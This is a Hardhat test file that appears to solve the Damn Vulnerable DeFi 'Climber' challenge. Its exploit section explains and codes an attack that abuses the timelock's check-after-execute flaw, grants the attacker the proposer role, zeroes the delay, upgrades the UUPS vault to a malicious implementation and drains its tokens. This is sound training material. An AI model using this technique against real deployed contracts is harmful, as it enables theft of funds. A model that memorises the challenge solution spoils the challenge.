const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
      /**
       * @dev
       * The TimeLock contract's execute() function does not respect the Check-Effects-Interaction pattern: it checks if an action is ready for execution after executing it (l.104 - 108).
       *    This allows us to bypass the waiting delay between scheduling and executing an      action: we can schedule an action, execute it, and include a call to updateDelay() in the execution to set it to 0, to pass the check line 108.
       *    The execute() function's visibility modifier is 'external', meaning anyone - i.e the attacker - can call it.
       *Now, what are the actions that need to be executed to empty the vault?
       *    -set our attacker contract as a PROPOSER of the Timelock, to be able to schedule an action -> call the grantRole() function from the Timelock contract(to pass the onlyRole modifier check)
       *    -update the timelock delay: set it as 0 to pass the check line 108. -> call updateDelay() from the Timelock contract
       *    -sweep all the funds.
       * The final problem is: how to call sweepFunds()? it can only be called by the sweeper, which can only be set internally.
       * -> ClimberVault is the Implementation contract following the UUPS pattern)
       * We can upgrade this implementation contract to a new one where setSweeper is does not have the onlySweeper modifier and can hence be called by anyone
       *
       * All these actions will need to be called from our attacking contract - schedule() is an external function and cannot be called from the Timelock contarct itself.
       * */

      const AttackContractFactory = await ethers.getContractFactory(
        'AttackTimelock',
        attacker
      );
      const attackContract = await AttackContractFactory.deploy(
        this.vault.address,
        this.timelock.address,
        this.token.address,
        attacker.address
      );


      const ClimberVaultV2Factory = await ethers.getContractFactory(
        'ClimberVaultV2',
        attacker
      );
      const climberVaultV2Contract = await ClimberVaultV2Factory.deploy();

      const PROPOSER_ROLE = ethers.utils.keccak256(
        ethers.utils.toUtf8Bytes('PROPOSER_ROLE')
      );

      //Encode all the actions
      //Set attacker contract as proposer for timelock
      const interfaceSetupRole = new ethers.utils.Interface([
        'function grantRole(bytes32 role, address account)',
      ]);
      const grantRoleData = interfaceSetupRole.encodeFunctionData('grantRole', [
        PROPOSER_ROLE,
        attackContract.address,
      ]);

      // Set timelock delay to 0
      const interfaceUpdateDelay = new ethers.utils.Interface([
        'function updateDelay(uint64 newDelay)',
      ]);
      const updateDelayData = interfaceUpdateDelay.encodeFunctionData(
        'updateDelay',
        [0]
      );

      // upgrade the implementation contract to our malicious climber vault
      const interfaceUpgrade = new ethers.utils.Interface([
        'function upgradeTo(address newImplementation)',
      ]);
      const upgradeData = interfaceUpgrade.encodeFunctionData('upgradeTo', [
        climberVaultV2Contract.address,
      ]);

      // call our attack() function that will schedule the actions and sweep the funds.
      const interfaceAttack = new ethers.utils.Interface(['function attack()']);
      const attackData = interfaceAttack.encodeFunctionData(
        'attack'
      );

      const dataAddress = [
        this.timelock.address,
        this.timelock.address,
        this.vault.address,
        attackContract.address,
      ];
      const data = [grantRoleData, updateDelayData, upgradeData, attackData];

      // Pass all the encoded actions as the calldata fpr our attack
      await attackContract.setCallData(dataAddress, data);

      await this.timelock
        .connect(attacker)
        .execute(
          dataAddress,
          Array(data.length).fill(0),
          data,
          ethers.utils.hexZeroPad('0x0', 32)
        );

      await attackContract.withdrawToAttacker();

      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
